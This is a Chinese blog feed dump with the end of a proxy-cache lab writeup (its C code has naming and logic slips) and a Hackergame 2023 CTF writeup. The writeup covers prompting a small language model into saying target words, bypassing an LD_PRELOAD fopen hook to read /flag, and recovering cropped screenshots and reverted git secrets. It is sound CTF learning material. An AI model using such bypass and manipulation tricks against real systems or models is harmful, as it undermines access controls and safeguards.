cache.data[i].isEmpty = <span class="hljs-number">0</span>;<br>    cache.data[i].lastusedtime = INT_MAX;<br>    updateLRU(i);<br>    V(&amp;cache.data[i].write_mutex);<br>&#125;<br><span class="hljs-comment">/* $end writeCache */</span><br></code></pre></td></tr></table></figure><p><code>getIndex</code>寻找可以插入的缓存行，返回目标插入位置（空行或用LRU策略替换的行）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * getIndex - find corresponding cache line</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin getIndex */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getIndex</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> min = INT_MAX;<br>    <span class="hljs-type">int</span> min_idx = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i+=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-comment">// update read_cnt, lock write_mutex</span><br>        P(&amp;cache.data[i].rcnt_mutex);<br>        cache.data[i].read_cnt+=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">1</span>) P(&amp;cache.data[i].write_mutex);<br>        V(&amp;cache.data[i].rcnt_mutex);<br>        <span class="hljs-comment">// found target line</span><br>        <span class="hljs-keyword">if</span> (cache.data[i].isEmpty)&#123;<br>            minindex = i;<br>            P(&amp;cache.data[i].rcnt_mutex);<br>            cache.data[i].read_cnt-=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>) V(&amp;cache.data[i].write_mutex);<br>            V(&amp;cache.data[i].rcnt_mutex);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-comment">// no target line, attempting to find LRU line</span><br>        <span class="hljs-keyword">if</span> (cache.data[i].lastusedtime &lt; min)&#123;<br>            minindex = i;<br>            P(&amp;cache.data[i].rcnt_mutex);<br>            cache.data[i].read_cnt-=<span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>) V(&amp;cache.data[i].write_mutex);<br>            V(&amp;cache.data[i].rcnt_mutex);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>        <span class="hljs-comment">// update read_cnt, unlock write_mutex</span><br>        P(&amp;cache.data[i].rcnt_mutex);<br>        cache.data[i].read_cnt-=<span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">if</span> (cache.data[i].read_cnt == <span class="hljs-number">0</span>) V(&amp;cache.data[i].write_mutex);<br>        V(&amp;cache.data[i].rcnt_mutex);<br>    &#125;<br>    <span class="hljs-keyword">return</span> minindex;<br>&#125;<br><span class="hljs-comment">/* $end getIndex */</span><br></code></pre></td></tr></table></figure><p><code>updateLRU</code>更新LRU计数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * updateLRU - update lastusedtime</span><br><span class="hljs-comment"> */</span><br><span class="hljs-comment">/* $begin updateLRU */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">update_LRU</span><span class="hljs-params">(<span class="hljs-type">int</span> index)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MAX_CACHE; i+=<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span> (!cache.data[i].isEmpty &amp;&amp; i!=index)&#123;<br>            P(&amp;cache.data[i].write_mutex);<br>            cache.data[i].lastusedtime-=<span class="hljs-number">1</span>;<br>            V(&amp;cache.data[i].write_mutex);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">/* $end updateLRU */</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Lab-Writeup</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>本站介绍</title>
    <link href="/Introduction/"/>
    <url>/Introduction/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>做个Web自留地还是很有必要的，特别是在网盘和微信公众号等平台极不靠谱、我又经常手欠重装系统和不慎格式化本地硬盘的情况下。</p><p>当然，我也并不介意把这些东西分享出来，欢迎关注并让我的网站访客++~</p><p>(￣▽￣)</p><p><strong>TODO:</strong></p><ul><li><p><input checked disabled type="checkbox"> 做个<del>日推</del>不定时更新的<a href="https://sgong-0224.github.io/music/">歌曲推荐</a>；</p><p><strong>已完成，可点击链接访问，也可点击顶栏相应按钮</strong> </p></li><li><p><input checked disabled type="checkbox"> 接入评论系统；</p><p><strong>已完成，可用GitHub登录</strong></p></li><li><p><input checked disabled type="checkbox"> 建立<a href="https://sgong-0224.github.io/remark/">留言板页面</a>；</p><p><strong>已完成，可点击链接访问，也可点击顶栏相应按钮；使用方式与文章底部评论区相同</strong></p></li><li><p><input disabled type="checkbox"> 找一些头图和背景图；</p></li><li><p><input checked disabled type="checkbox"> 完善这篇介绍。</p><p>  <strong>应该没有什么可完善的了</strong></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>杂谈</category>
      
    </categories>
    
    
    <tags>
      
      <tag>README</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hackergame 2023 Writeup</title>
    <link href="/Hackergame2023_WP/"/>
    <url>/Hackergame2023_WP/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Preface"><a href="#Preface" class="headerlink" title="Preface"></a>Preface</h2><p>又是一年Hackergame，非常好比赛，爱来自USTC。</p><p>今年战果还行，General翻了一倍多，Web翻了两倍多（为了通过CS4009，疯狂魔改开源项目，做了<a href="https://github.com/sgong-0224/USTC-CS4009-BGMS2023">一个非常答辩的SSM项目</a>交差，高低接触了一点Web），Math翻了一倍，但Binary没有和去年一样白送，去年的片上系统和RoboGame调速器确实很好拿。</p><img src="/Hackergame2023_WP/image-20231105145604585.png" alt="image-20231105145604585" style="zoom: 50%;"><p>去年的部分题解（懒得填坑了，并且原始文件已大部丢失）：</p><blockquote><p>Hackergame 2022 Write-UP(1) Preface&amp;签到题：</p><p><a href="https://zhuanlan.zhihu.com/p/578473229">https://zhuanlan.zhihu.com/p/578473229</a></p><p>Hackergame 2022 Write-UP(2) 线路板&amp;Heilang：</p><p><a href="https://zhuanlan.zhihu.com/p/578507735">https://zhuanlan.zhihu.com/p/578507735</a></p><p>Hackergame 2022 Write-UP(3) 有趣的社工题——旅行照片2.0：</p><p><a href="https://zhuanlan.zhihu.com/p/580737134">https://zhuanlan.zhihu.com/p/580737134</a></p></blockquote><p>本文已经过优化以适合在线阅读，更正了原始writeup中的一些表述，重新组织并添加了部分内容。</p><p>获取题目附件、官方题解、更多选手题解请访问<a href="https://github.com/USTC-Hackergame/hackergame2023-writeups/tree/master">官方repo</a>。</p><h2 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h2><h3 id="🪐-小型大语言模型星球（部分完成）"><a href="#🪐-小型大语言模型星球（部分完成）" class="headerlink" title="🪐 小型大语言模型星球（部分完成）"></a>🪐 小型大语言模型星球（部分完成）</h3><h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h4><blockquote><p>包含 AI 辅助创作</p></blockquote><p><img src="/Hackergame2023_WP/cover.jpeg" alt="cover.jpeg" style="zoom:25%;"></p><p>茫茫星系间，文明被分为不同的等级。每一个文明中都蕴藏了一种古老的力量 —— flag，被认为是其智慧的象征。</p><p>你在探索的过程中意外进入了一个封闭空间。这是一个由神秘的 33M 参数的「小型大语言模型」控制着的星球。星球的中心竖立着一个巨大的三角形任务牌，上面刻着密文和挑战。</p><p>在这个星球上，你需要与这个先进的语言模型展开一场交流。通过与它对话，诱导它说出指定的词语，从这个神秘智慧体中获得 flag。你需要让这个语言模型分别说出 <code>you are smart</code>，<code>accepted</code>，<code>hackergame</code> 和 <code>🐮</code>，以获得四个 flag，证明你足够聪明以控制这个星球的命运。</p><h4 id="题解（部分）："><a href="#题解（部分）：" class="headerlink" title="题解（部分）："></a>题解（部分）：</h4><p>试着让AI复述一遍，得到第一个flag：</p><p><img src="/Hackergame2023_WP/image-20231028221006530.png" alt="image-20231028221006530" style="zoom: 50%;"></p><p>要拿到第二个flag，只允许输入7个字符，又要把<code>accept</code>喂给AI，在单词后面加点什么：</p><p><img src="/Hackergame2023_WP/image-20231102223727988.png" alt="image-20231102223727988" style="zoom:50%;"></p><h2 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h2><h3 id="异星歧途"><a href="#异星歧途" class="headerlink" title="异星歧途"></a>异星歧途</h3><h4 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h4><p>你降落在荒废星球的角落，开始新的征程，但从科技树底层一步步发展总是令人不快。幸运的是，在看似荒废的土地上仍然留存着高级文明的痕迹：你找到一台冲击反应堆——如果它工作起来，就可以获得用之不尽的电力——尽管它现在没有启动，并且控制工作条件的部件和工厂被 32 个按钮和相连的逻辑系统牢牢掌控。</p><p>于是：你的任务是在不进行任何其他操作的情况下拨动这 32 个按钮，使冲击反应堆能够<strong>稳定运行</strong>。</p><p>请点击下方的「打开&#x2F;下载题目」按钮，下载题目文件。题目文件对应的 Mindustry 版本为 <a href="https://anuke.itch.io/mindustry">7.0 Build 146</a>。打开游戏后依次选择 <strong>地图编辑器—加载地图—选择题目文件 <code>the_planet.msav</code> —返回主菜单</strong>，然后选择 <strong>开始游戏—自定义游戏—选择导入的名为 the planet 的地图—不改变任何选项点击开始游戏</strong> 。开启后的游戏界面如下图，按钮已经用红框标出：</p><p><img src="/Hackergame2023_WP/the_planet_game.png" alt="img" style="zoom: 25%;"></p><p>将正确的按钮序列以 01 序列的形式提交至 <a href="http://202.38.93.111:10070/?token=100:MEYCIQDItbzZqomRIzB2XFidK6xuWZqJJN6B7fQ8IVGrWxJy4QIhAMt7pPkeS/EfagJBALILoVT0TstZfeHgm0cmOMnpqcT8">检查网站</a> 或 <code>nc 202.38.93.111 10071</code> 获得 flag。按钮未按下（即游戏开始时默认状态）用 0 表示，按下（即点击按钮后按钮颜色变亮）用 1 表示，顺序从左到右。</p><p>提示：在游戏主菜单选择 <strong>设置—图形—显示建筑状态</strong> 可以开启建筑状态显示（即图片中建筑右下角的菱形），这可能有助于解题。</p><p>提示：为了完成目标，你可能需要以特定的顺序拨动这些按钮，但这不影响结果：只有唯一一组按钮组合能满足要求。如果在满足要求后再次改变按钮，冲击反应堆可能会继续运行一段时间，但会在 1-3 分钟后停止，不可能<strong>稳定运行</strong>。</p><h4 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h4><p>这个思路纯纯的非预期，全程不碰代码。</p><p>先用<code>Vars.state.rules.reactorExplosions = !Vars.state.rules.reactorExplosions</code>指令减少爆炸的损伤（虽然没什么用）。处理第1,2,4组开关直到它们引出的线路导通，这个过程可能会爆炸多次，最后可以发现需要提交的序列可能形如<code>10100101 11000100 XXXXXXXX 01110111</code>，<code>X</code>为未知，空格仅为了优化可读性而添加。</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(190).png" alt="屏幕截图(190)" style="zoom:25%;"></p><p>第三组序列未定，因为它非常危险，稍有不慎容易造成爆炸，只好重新读档再来。</p><p>试着通过游戏中表现出的状况推断序列：</p><blockquote><p>第8位不能为1——否则就爆炸了；</p><p>第7位不能为1——否则设备大面积瘫痪；</p><p>第6位必须为1，而第2和第4位不能为1——涉及到冷却液；</p><p>第3位必须为1——要给下面的反应堆供能。</p></blockquote><p>第1位和第5位暂时空缺，4种情况分别提交试试看。</p><p>答案是<code>10100101 11000100 10001100 01110111</code>。拿到flag：</p><p><img src="/Hackergame2023_WP/image-20231029201518809.png" class title="image-20231029201518809"></p><h3 id="为什么要打开-flag-😡（部分完成）"><a href="#为什么要打开-flag-😡（部分完成）" class="headerlink" title="为什么要打开 &#x2F;flag 😡（部分完成）"></a>为什么要打开 &#x2F;flag 😡（部分完成）</h3><h4 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a>题目描述：</h4><blockquote><p>至少见一面让我当面道歉好吗？😭我也吓了一跳，没想到事情会演变成那个样子……😭所以我想好好说明一下😭我要是知道就会阻止它们的，但是明明文件描述符都已经关闭了突然间开始 <code>open()</code>😭没能阻止大家真是对不起……😭你在生气对吧……😭我想你生气也是当然的😭但是请你相信我。<code>/flag</code>，本来没有在我们的预定打开的文件里的😭真的很对不起😭我答应你再也不会随意打开文件了😭我会让各个函数保证再也不打开这个文件😭能不能稍微谈一谈？😭我真的把这里的一切看得非常重要😭所以说，擅自打开 <code>/flag</code> 的时候我和你一样难过😭我希望你能明白我的心情😭拜托了。我哪里都会去的😭我也会好好跟你说明我不得不这么做的理由😭我想如果你能见我一面，你就一定能明白的😭我是你的同伴😭我好想见你😭</p></blockquote><hr><p>挽留失败后，她决定在程序启动时做些手脚，让所有访问 <code>/flag</code> 的请求都以某种方式变成打开 <code>/fakeflag</code> 的请求。</p><p>「我不会再打开 <code>/flag</code> 了」。真的吗？</p><h4 id="题解（部分）：-1"><a href="#题解（部分）：-1" class="headerlink" title="题解（部分）："></a>题解（部分）：</h4><p>观察lib.c可以发现，<code>fopen</code>等一大堆文件操作被劫持了，也不能用syscall规避。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">FILE *<span class="hljs-title function_">fopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> pathname, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span> mode)</span> &#123;<br>    <span class="hljs-type">static</span> FILE *(*real_fopen)(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *<span class="hljs-keyword">restrict</span>) = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span> (real_fopen == <span class="hljs-literal">NULL</span>) &#123;<br>        real_fopen = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;fopen&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (is_flag(pathname)) &#123;<br>        <span class="hljs-keyword">return</span> real_fopen(<span class="hljs-string">&quot;/fakeflag&quot;</span>, mode);<span class="hljs-comment">//肯定是拿不到flag的</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> real_fopen(pathname, mode);<br>&#125;<br><span class="hljs-comment">//other codes</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">system</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *command)</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//other codes</span><br></code></pre></td></tr></table></figure><p>然而可以另辟蹊径，不用这些函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">ifstream <span class="hljs-title">Finput</span><span class="hljs-params">(<span class="hljs-string">&quot;/flag&quot;</span>)</span></span>;<br>    vector&lt;<span class="hljs-type">char</span>&gt; bytes;<span class="hljs-type">char</span> byte=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (Finput.<span class="hljs-built_in">get</span>(byte)) &#123;<br>        bytes.<span class="hljs-built_in">push_back</span>(byte);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;i : bytes) &#123;<br>        cout &lt;&lt; i;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>拿到第一个flag：</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(232_1).png" alt="屏幕截图(232_1)" style="zoom: 50%;"></p><h2 id="General"><a href="#General" class="headerlink" title="General"></a>General</h2><h3 id="猫咪小测"><a href="#猫咪小测" class="headerlink" title="猫咪小测"></a>猫咪小测</h3><h4 id="题目描述：-3"><a href="#题目描述：-3" class="headerlink" title="题目描述："></a>题目描述：</h4><ol><li>想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？</li><li>今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？</li><li>为了支持 TCP BBR 拥塞控制算法，在<strong>编译</strong> Linux 内核时应该配置好哪一条内核选项？</li><li>🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 <del>MyPY</del> mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？</li></ol><h4 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h4><p>1.访问lib.ustc.edu.cn，然后悬停鼠标（这个操作没法截图）：</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(90).png" alt="屏幕截图(90)" style="zoom:25%;"></p><p>答案：<strong>12</strong></p><p>2.搜索一下，再读论文就可以知道答案：</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(100).png" alt="屏幕截图(100)" style="zoom:25%;"><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(101).png" alt="屏幕截图(101)" style="zoom:50%;"></p><p>答案:<strong>23</strong></p><p>3.看这篇<a href="https://www.cyberciti.biz/cloud-computing/increase-your-linux-server-internet-speed-with-tcp-bbr-congestion-control/">Increase Linux Internet speed with TCP BBR congestion control - nixCraft (cyberciti.biz)</a></p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(91).png" alt="屏幕截图(91)" style="zoom:25%;"></p><p>答案:<strong>CONFIG_TCP_CONG_BBR</strong></p><p>4.尝试拼凑几个关键词，往下翻翻只找到一篇论文：</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(92).png" alt="屏幕截图(92)" style="zoom:25%;"><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(93).png" alt="屏幕截图(93)" style="zoom:25%;"></p><p>如果点进去看，会发现前几页就是关于Python类型检查的代码。搜索这篇论文：</p><p><img src="/Hackergame2023_WP/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(96).png" alt="屏幕截图(96)" style="zoom: 33%;"></p><p>答案：<strong>ECOOP</strong></p><p><strong>拿到flag：</strong></p><p><img src="/Hackergame2023_WP/image-20231102224254935.png" alt="image-20231102224254935" style="zoom:50%;"></p><h3 id="奶奶的睡前-flag-故事"><a href="#奶奶的睡前-flag-故事" class="headerlink" title="奶奶的睡前 flag 故事"></a>奶奶的睡前 flag 故事</h3><h4 id="题目描述：-4"><a href="#题目描述：-4" class="headerlink" title="题目描述："></a>题目描述：</h4><blockquote><p>包含 AI 辅助创作</p></blockquote><p>（以下内容由 GPT 辅助编写，如有雷同纯属巧合）</p><p>晴空万里的假期终于拍了拍翅膀飞来了。对于一心想扔掉教材、砸掉闹钟、跃向世界的 L 同学来说，期待了整整三年的跨国旅游大业终于是时候启动了，还能巧妙地顺带着做个美满的老友记。</p><p>可是，哎哟喂，他刚踩上波光粼粼的金沙海滩，那他最疼爱的华为手机就跟着海风一起去约会了大海，连他的钱包也在这场未知探索之旅中神秘失踪。</p><p>「这个地方怎么连个华为手机都不卖。若是买个苹果手机，心疼的是它连个实体 SIM 卡槽都藏起来了，回国肯定成了个大摆设。不如来个<strong>谷歌的『亲儿子』</strong>？」L 同学踌躇满志地嘀咕道。</p><p>那时，像是上天的安排，「咱这儿正好有个<strong>谷歌『亲儿子』</strong>的老手机，你拿去逍遥吧」。</p><p>L 同学满眼星光地接过，<strong>连系统都没心思升级</strong>，就开始疯狂安装那个久闻大名的 GPT 程序，甚至雀跃地在群里晒出一张跟 GPT 对话的精彩<strong>截图</strong>，一时间成为了群里的焦点人物。</p><p><img src="/Hackergame2023_WP/screenshot.png" alt="screenshot.png" style="zoom:25%;"></p><p>你能从这张图片里找到 flag 吗？</p><h4 id="题解：-2"><a href="#题解：-2" class="headerlink" title="题解："></a>题解：</h4><p>注意到加粗的“谷歌『亲儿子』”、“连系统都没心思升级“，然而几个月前就有人爆料AOSP照片和Windows截图工具在仅仅覆写了一部分这个大bug(i.e.<strong>Acropalypse</strong>)，相关链接见<a href="https://zhuanlan.zhihu.com/p/619038753?utm_source=zhihu">打过码的图片等于没打，用Windows的要小心了 - 知乎 (zhihu.com)</a>。</p><p>有个Acropalypse Hacktool:<a href="https://acropalypse.app/">acropalypse</a>，原图短边1080px，设置机型为Pixel 7，坐和放宽并等待flag吧：</p><p><img src="/Hackergame2023_WP/9f5d0a07-1b63-4f32-b4c9-ae864a72f41f.png" alt="9f5d0a07-1b63-4f32-b4c9-ae864a72f41f" style="zoom:25%;"></p><h3 id="Git-Git"><a href="#Git-Git" class="headerlink" title="Git? Git!"></a>Git? Git!</h3><h4 id="题目描述：-5"><a href="#题目描述：-5" class="headerlink" title="题目描述："></a>题目描述：</h4><blockquote><p>图片使用 AI 技术生成，与真实人物无关。</p></blockquote><p><img src="/Hackergame2023_WP/copy.jpg" alt="img" style="zoom:25%;"></p><p>「幸亏我发现了……」马老师长吁了一口气。</p><p>「马老师，发生甚么事了？」马老师的一位英国研究生问。</p><p>「刚刚一不小心，把 flag 提交到本地仓库里了。」马老师回答，「还好我发现了，撤销了这次提交，不然就惨了……」</p><p>「这样啊，那太好了。」研究生说。</p><p>马老师没想到的是，这位年轻人不讲武德，偷偷把他的本地仓库拷贝到了自己的电脑上，然后带出了实验室，想要一探究竟……</p><h4 id="题解：-3"><a href="#题解：-3" class="headerlink" title="题解："></a>题解：</h4><p>试一试<code>git reflog</code>和<code>git diff</code>，轻易地获得了flag：</p><p><img src="/Hackergame2023_WP/image-20231028144426997.png" alt="image-20231028144426997" style="zoom: 33%;"></p><h3 id="旅行照片-3-0"><a href="#旅行照片-3-0" class="headerlink" title="旅行照片 3.0"></a>旅行照片 3.0</h3><h4 id="题目描述：-6"><a href="#题目描述：-6" class="headerlink" title="题目描述："></a>题目描述：</h4><p>你的学长去留学了，这一走短时间内怕是回不来了。于是，你在今年暑假来了一场计划已久的旅行，并顺路探望了这位久别的学长。翻阅当天拍下的照片， 种种回忆和感慨油然而生。</p><p>请观察照片并结合所有文字内容，正确回答题目以获取 flag。</p><p><strong>上午</strong></p><p>与学长碰面后，他带你参观了他的学校。在校园的一个展厅内，你发现了一枚神秘的金色奖牌，它闪闪发光，令人心生羡慕。</p><p><img src="/Hackergame2023_WP/01-169848301841748.jpg" alt="01" style="zoom:25%;"></p><p><strong>中午</strong></p><p>离开校园后，你和学长走到了附近的一家拉面馆用餐。那家店里的拉面香气扑鼻，店内的装饰和氛围也充满了日式的风格。 学长（下图左一）与你分享了不少学校的趣事。饭后，你们决定在附近散步，享受这难得的闲暇时光。当你们走到一座博物馆前时， 马路对面的喷泉和它周围的景色引起了你的注意。下午，白色的帐篷里即将举办一场大型活动，人们忙碌的身影穿梭其中，充满了期待与热情。</p><p><img src="/Hackergame2023_WP/02-169848306163250.jpg" alt="02" style="zoom:25%;"></p><p><img src="/Hackergame2023_WP/03-169848307132952.jpg" alt="03" style="zoom:25%;"></p><p><strong>下午和夜晚</strong></p><p>在参观完博物馆后，学长陪你走到了上野站。你们都感到有些不舍，但知道每次的分别也是为了下次更好的相聚。 学长那天晚上将继续他的学术之旅，打算乘船欣赏东京的迷人夜景和闪耀的彩虹大桥（Rainbow Bridge）。 而你则搭乘了开往马里奥世界的电车，在那里度过了一段欢乐的时光。</p><p><img src="/Hackergame2023_WP/04-169848295807342.jpg" alt="04" style="zoom: 25%;"></p><p>1、你还记得与学长见面这天是哪一天吗？（格式：yyyy-mm-dd）</p><p>2、在学校该展厅展示的所有同种金色奖牌的得主中，出生最晚者获奖时所在的研究所缩写是什么？</p><p>3、帐篷中活动招募志愿者时用于收集报名信息的在线问卷的编号（以字母 S 开头后接数字）是多少？</p><p>4、学长购买自己的博物馆门票时，花费了多少日元？</p><p>5、学长当天晚上需要在哪栋标志性建筑物的附近集合呢？（请用简体中文回答，四个汉字）</p><p>6、进站时，你在 JR 上野站中央检票口外看到「ボタン＆カフリンクス」活动正在销售动物周边商品，该活动张贴的粉色背景海报上是什么动物（记作 A，两个汉字）？ 在出站处附近建筑的屋顶广告牌上，每小时都会顽皮出现的那只 3D 动物是什么品种？（记作 B，三个汉字）？（格式：A-B）</p><h4 id="题解：-4"><a href="#题解：-4" class="headerlink" title="题解："></a>题解：</h4><p>1.暑假也没多少天，写脚本还不如枚举。</p><p>2.搜索M.KOSHIBA，容易对应到<strong>东京大学的诺奖得主</strong>Masatoshi Koshiba。</p><p>​    访问东京大学官网<a href="https://www.s.u-tokyo.ac.jp/en/gallery/nobelprize/">Nobel Prize (u-tokyo.ac.jp)</a>即可获得展出诺奖奖牌的得主名单，包括出生年份。</p><p><strong>答案及第一个flag：</strong></p><p><img src="/Hackergame2023_WP/image-20231028171549805.png" alt="image-20231028171549805" style="zoom: 50%;"></p><p>3.喷泉和东京上野公园(Ueno Park)的景观一致，活动是“2023年东京全国梅酒节”，网页链接<a href="https://home.ueno.kokosil.net/en/archives/77158">Held for the first time in four years! “National Plum Wine Festival in Tokyo 2023” will be held at Ueno Park Fountain Square! Taste and compare more than 170 kinds of delicious “plum wine” made by sake breweries all over Japan from north to south. | kokosil Ueno</a></p><p>页面底部有志愿者招募链接<a href="https://umeshu-matsuri.jp/tokyo_staff/%EF%BC%8C%E6%89%93%E5%BC%80%E9%93%BE%E6%8E%A5%E5%B0%B1%E8%83%BD%E7%9C%8B%E5%88%B0%E7%AD%94%E6%A1%88%E3%80%82">https://umeshu-matsuri.jp/tokyo_staff/，打开链接就能看到答案。</a></p><p><img src="/Hackergame2023_WP/image-20231101173615422.png" alt="image-20231101173615422" style="zoom: 33%;"></p><p>4.尝试出来的。填500&#x2F;620&#x2F;1000等附近几个博物馆的票价都不对，索性填个0竟然对了。</p><p><strong>答案及第二个flag：</strong></p><p><img src="/Hackergame2023_WP/image-20231101173855056.png" alt="image-20231101173855056" style="zoom: 